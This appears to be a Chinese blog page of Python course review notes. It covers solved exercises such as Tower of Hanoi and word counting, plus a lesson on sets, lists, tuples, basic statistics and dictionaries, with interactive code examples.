<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取输入并解析为两个整数</span></span><br><span class="line">input_str = <span class="built_in">input</span>()</span><br><span class="line">a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, input_str.split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算种子并设置随机种子</span></span><br><span class="line">seed = a + b</span><br><span class="line">random.seed(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成20个32-127之间的随机数并转换为字符</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    num = random.randint(<span class="number">32</span>, <span class="number">127</span>)</span><br><span class="line">    result.append(<span class="built_in">chr</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合成字符串并输出</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p><strong>7.汉诺塔实践</strong></p>
<p>汉诺塔问题大家都清楚，这里不再赘述。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>请补充编程模板中代码，完成如下功能：‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>有三个圆柱<code>A、B、C</code>，初始时A上有<code>N</code>个圆盘，<code>N</code>由用户输入给出，最终移动到圆柱<code>C</code>上。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>每次移动步骤的表达方式示例如下：<code>[STEP 10] A-&gt;C</code>。其中<code>STEP</code>是步骤序号，宽度为4个字符，右对齐。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>请编写代码，获得输入<code>N</code>后，输出汉诺塔移动的步骤。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">steps = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hanoi</span>(<span class="params">src, des, mid, n</span>):</span><br><span class="line">    <span class="keyword">global</span> steps</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        steps += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[STEP&#123;:&gt;4&#125;] &#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(steps, src, des))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanoi(src, mid, des, n-<span class="number">1</span>)</span><br><span class="line">        steps += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[STEP&#123;:&gt;4&#125;] &#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(steps, src, des))</span><br><span class="line">        hanoi(mid, des, src, n-<span class="number">1</span>)</span><br><span class="line">N = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">hanoi(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;B&quot;</span>, N)</span><br></pre></td></tr></table></figure>

<p><strong>8.英文单词个数统计</strong></p>
<p>给出一个字符串<code>s</code>，内容参见”编程模板”，请统计并打印字符串<code>s</code>中出现单词的个数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;Collusion is very real with Russia,&quot; Trump quoted conservative commentator Dan Bongino as saying on Trump&#x27;s favorite Fox News morning show, &quot;but only with Hillary and the Democrats, and we should demand a full investigation.&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_words</span>(<span class="params">text</span>):</span><br><span class="line">    words = text.split()  <span class="comment">#默认按空格分割，并自动去除空字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(words)</span><br><span class="line"><span class="built_in">print</span>(count_words(s))</span><br></pre></td></tr></table></figure>

<h1 id="组合数据类型"><a href="#组合数据类型" class="headerlink" title="组合数据类型"></a>组合数据类型</h1><h2 id="组合数据类型概述"><a href="#组合数据类型概述" class="headerlink" title="组合数据类型概述"></a>组合数据类型概述</h2><h3 id="组合数据类型-1"><a href="#组合数据类型-1" class="headerlink" title="组合数据类型"></a>组合数据类型</h3><p>计算机不仅对单个变量表示的数据进行处理，更多情况，计算机需要对一组数据进行批量处理。一些例子包括：<br>给定一组单词{python, data, function, list, loop}，计算并输出每个单词的长度；<br>给定一个学院学生信息，统计一下男女生比例；<br>一次实验产生了很多组数据，对这些大量数据进行分析；</p>
<p>组合数据类型能够将多个同类型或不同类型的数据组织起来，通过单一的表示使数据操作更有序更容易。根据数据之间的关系，组合数据类型可以分为三类：<strong>序列类型、集合类型和映射类型。</strong></p>
<p>序列类型是一个元素向量，元素之间存在先后关系，通过序号访问，序列中元素值可以不唯一。</p>
<p>集合类型是一个元素集合，元素之间无序，相同元素在集合中唯一存在。</p>
<p>映射类型是“键-值”数据项的组合，每个元素是一个键值对，表示为(key, value)。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2078.png" alt="image.png"></p>
<h3 id="集合类型"><a href="#集合类型" class="headerlink" title="集合类型"></a>集合类型</h3><p>*定义</p>
<p><strong>集合是多个元素的无序组合</strong>，集合元素可以是：整数、浮点数、字符串、元组；不可以是：列表、集合、字典。</p>
<p>集合类型与数学中的集合概念一致</p>
<p>集合元素之间无序，每个元素唯一，不存在相同元素</p>
<p>集合元素不可更改，不能是可变数据类型</p>
<p>集合用大括号 {} 表示，元素间用逗号分隔</p>
<p>建立集合类型用 {} 或 set()：<strong>set的参数必须为可迭代的数据类型</strong></p>
<p>建立空集合类型，必须使用set()：<strong>如果写成{}，Python解释器认为是空字典而不是空集合</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = &#123;<span class="string">&quot;python&quot;</span>, <span class="number">123</span>, (<span class="string">&quot;python&quot;</span>,<span class="number">123</span>)&#125;  <span class="comment">#使用&#123;&#125;建立集合</span></span><br><span class="line">&#123;<span class="number">123</span>, <span class="string">&#x27;python&#x27;</span>, (<span class="string">&#x27;python&#x27;</span>, <span class="number">123</span>)&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B = <span class="built_in">set</span>(<span class="string">&quot;pypy123&quot;</span>)         <span class="comment">#使用set()建立集合</span></span><br><span class="line">&#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>C = &#123;<span class="string">&quot;python&quot;</span>, <span class="number">123</span>, <span class="string">&quot;python&quot;</span>,<span class="number">123</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;python&#x27;</span>, <span class="number">123</span>&#125;</span><br></pre></td></tr></table></figure>

<p>*集合间操作</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2079.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2080.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2081.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;y&quot;</span> , <span class="number">123</span>&#125; </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B = <span class="built_in">set</span>(<span class="string">&quot;pypy123&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A-B</span><br><span class="line">&#123;<span class="number">123</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B-A</span><br><span class="line">&#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A&amp;B</span><br><span class="line">&#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A|B</span><br><span class="line">&#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="number">123</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A^B</span><br><span class="line">&#123;<span class="string">&#x27;2&#x27;</span>, <span class="number">123</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>*集合处理方法</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2082.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2083.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;y&quot;</span> , <span class="number">123</span>&#125; </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> item <span class="keyword">in</span> A:</span><br><span class="line">        <span class="built_in">print</span>(item, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">p123y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A</span><br><span class="line">&#123;<span class="string">&#x27;p&#x27;</span>, <span class="number">123</span>, <span class="string">&#x27;y&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">try</span>: </span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           <span class="built_in">print</span>(A.pop(), end=<span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line">p123y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A</span><br><span class="line"><span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p>*集合类型应用场景</p>
<p><strong>（1）包含关系比较</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;p&quot;</span> <span class="keyword">in</span> &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;y&quot;</span> , <span class="number">123</span>&#125;</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;y&quot;</span>&#125; &gt;= &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;y&quot;</span> , <span class="number">123</span>&#125;</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>（2）数据去重：集合类型所有元素无重复</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = [<span class="string">&quot;p&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="number">123</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="built_in">set</span>(ls)    <span class="comment"># 利用了集合无重复元素的特点</span></span><br><span class="line">&#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">123</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lt = <span class="built_in">list</span>(s)   <span class="comment"># 还可以将集合转换为列表</span></span><br><span class="line">[<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="number">123</span>]</span><br></pre></td></tr></table></figure>

<h3 id="序列类型"><a href="#序列类型" class="headerlink" title="序列类型"></a>序列类型</h3><p>序列类型是一维元素向量，元素之间存在先后关系，通过序号访问。当需要访问序列中某特定值时，只需要通过下标标出即可。</p>
<p>由于元素之间存在顺序关系，所以序列中可以存在相同数值但位置不同的元素。序列类型支持成员关系操作符（in）、长度计算函数（len()）、分片（[]），元素本身也可以是序列类型。</p>
<p>Python语言中有很多数据类型都是序列类型，其中比较重要的是：<strong>str（字符串）、tuple（元组）、list（列表）。</strong></p>
<p>元组是包含0个或多个数据项的不可变序列类型。元组生成后是固定的，其中任何数据项不能替换或删除。列表则是一个可以修改数据项的序列类型，使用也最灵活。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2084.png" alt="image.png"></p>
<p>序列类型有12个通用的操作符和函数</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2085.png" alt="image.png"></p>
<h3 id="元组类型定义"><a href="#元组类型定义" class="headerlink" title="元组类型定义"></a>元组类型定义</h3><p><strong>（1）元组是序列类型的一种扩展</strong></p>
<p>元组是一种序列类型，一旦创建就不能被修改</p>
<p>使用小括号 () 或 tuple() 创建，元素间用逗号，分隔可以使用或不使用小括号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>creature = <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;tiger&quot;</span>, <span class="string">&quot;human&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>creature </span><br><span class="line">(<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="string">&#x27;human&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>color = (<span class="number">0x001100</span>, <span class="string">&quot;blue&quot;</span>, creature)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>color</span><br><span class="line">(<span class="number">4352</span>, <span class="string">&#x27;blue&#x27;</span>, (<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="string">&#x27;human&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><strong>（2）元组继承序列类型的全部通用操作</strong></p>
<p>元组继承了序列类型的全部通用操作</p>
<p>元组因为创建后不能修改，因此没有特殊操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>creature = <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;tiger&quot;</span>, <span class="string">&quot;human&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>creature[::-<span class="number">1</span>] </span><br><span class="line">(<span class="string">&#x27;human&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>color = (<span class="number">0x001100</span>, <span class="string">&quot;blue&quot;</span>, creature)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>color[-<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;tiger&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="列表类型定义"><a href="#列表类型定义" class="headerlink" title="列表类型定义"></a>列表类型定义</h3><p>*<strong>列表是序列类型的一种扩展，十分常用</strong></p>
<p>列表是一种序列类型，创建后可以随意被修改</p>
<p>使用方括号[]或list()创建，元素间用逗号，分隔使用list()创建列表，参数必须为可迭代的数据类型</p>
<p>列表中各元素类型可以不同，无长度限制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;tiger&quot;</span>, <span class="number">1024</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls</span><br><span class="line">[<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="number">1024</span>] </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lt = ls</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lt</span><br><span class="line">[<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="number">1024</span>]</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2086.png" alt="image.png"></p>
<p>*列表类型操作函数和方法</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2087.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;tiger&quot;</span>, <span class="number">1024</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls[<span class="number">1</span>:<span class="number">2</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">[<span class="string">&#x27;cat&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="number">1024</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> ls[::<span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="string">&#x27;tiger&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls*<span class="number">2</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="string">&#x27;tiger&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2088.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;tiger&quot;</span>, <span class="number">1024</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.append(<span class="number">1234</span>)</span><br><span class="line">[<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="number">1024</span>, <span class="number">1234</span>] </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.insert(<span class="number">3</span>, <span class="string">&quot;human&quot;</span>)</span><br><span class="line">[<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="string">&#x27;human&#x27;</span>, <span class="number">1024</span>, <span class="number">1234</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.reverse()</span><br><span class="line">[<span class="number">1234</span>, <span class="number">1024</span>, <span class="string">&#x27;human&#x27;</span>, <span class="string">&#x27;tiger&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>*<strong>列表功能默写</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2089.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2090.png" alt="image.png"></p>
<h2 id="基本统计值计算"><a href="#基本统计值计算" class="headerlink" title="基本统计值计算"></a>基本统计值计算</h2><p>以最简单的统计问题为例，求解一组不定长数据的基本统计值，即平均值、标准差、中位数。</p>
<p>一组数据表示为S&#x3D;s0, s1, …, sn-1，其算术平均值、标准差分别表示为：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2091.png" alt="image.png"></p>
<p>由于平均数、标准差和中位数是三个不同的计算目标，使用函数方式编写计算程序。</p>
<p>getNum()函数从用户输入获得数据、mean()函数计算平均值、dev()函数计算标准差、median()函数计算中位数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e9.1CalStatistics.py</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getNum</span>():       <span class="comment">#获取用户输入</span></span><br><span class="line">    nums = []</span><br><span class="line">    iNumStr = <span class="built_in">input</span>(<span class="string">&quot;请输入数字(直接输入回车退出): &quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> iNumStr != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        nums.append(<span class="built_in">eval</span>(iNumStr))</span><br><span class="line">        iNumStr = <span class="built_in">input</span>(<span class="string">&quot;请输入数字(直接输入回车退出): &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mean</span>(<span class="params">numbers</span>):  <span class="comment">#计算平均值</span></span><br><span class="line">    s = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">        s = s + num</span><br><span class="line">    <span class="keyword">return</span> s / <span class="built_in">len</span>(numbers)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dev</span>(<span class="params">numbers, mean</span>): <span class="comment">#计算方差</span></span><br><span class="line">    sdev = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">        sdev = sdev + (num - mean)**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> sqrt(sdev / (<span class="built_in">len</span>(numbers)-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">median</span>(<span class="params">numbers</span>):    <span class="comment">#计算中位数</span></span><br><span class="line">    new=<span class="built_in">sorted</span>(numbers) <span class="comment">#sorted函数，返回列表排序结果</span></span><br><span class="line">    size = <span class="built_in">len</span>(numbers)</span><br><span class="line">    <span class="keyword">if</span> size % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        med = (new[size//<span class="number">2</span>-<span class="number">1</span>] + new[size//<span class="number">2</span>])/<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        med = new[size//<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> med</span><br><span class="line">n =  getNum()  <span class="comment">#主体函数</span></span><br><span class="line">m =  mean(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;平均值:&#123;&#125;,方差:&#123;:.2&#125;,中位数:&#123;&#125;.&quot;</span>.<span class="built_in">format</span>(m,\dev(n,m),median(n)))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">请输入数字(直接输入回车退出): <span class="number">99</span></span><br><span class="line">请输入数字(直接输入回车退出): <span class="number">98</span></span><br><span class="line">请输入数字(直接输入回车退出): <span class="number">97</span></span><br><span class="line">请输入数字(直接输入回车退出): <span class="number">96</span></span><br><span class="line">请输入数字(直接输入回车退出): <span class="number">95</span></span><br><span class="line">请输入数字(直接输入回车退出): </span><br><span class="line">平均值:<span class="number">97.0</span>,方差:<span class="number">1.6</span>,中位数:<span class="number">97.</span></span><br></pre></td></tr></table></figure>

<p>程序先后调用getNum()、mean()、dev()和median()函数。利用函数的模块化设计能够复用代码并增加代码的可读性。每个函数内部都采用了简单的语句。</p>
<p>列表在实现基本数据统计时发挥了重要作用，表现在：列表是一个动态长度的数据结构，可以根据需求增加或减少元素；列表的一系列方法或操作符为计算提供了简单的元素运算手段；列表提供了对每个元素的简单访问方式及所有元素的遍历方式。</p>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><h3 id="字典类型定义"><a href="#字典类型定义" class="headerlink" title="字典类型定义"></a>字典类型定义</h3><p>理解“映射”：<strong>（1）映射是一种键(索引)和值(数据)的对应</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2092.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2093.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2094.png" alt="image.png"></p>
<p><strong>（2）字典类型是“映射”的体现</strong></p>
<p>键值对：键是数据索引的扩展</p>
<p>字典是键值对的集合，键值对之间无序</p>
<p>采用大括号{}和dict()创建，键值对用冒号: 表示{&lt;键1&gt;:&lt;值1&gt;,&lt;键2&gt;:&lt;值2&gt;, … ,&lt;键n&gt;:&lt;值n&gt;}</p>
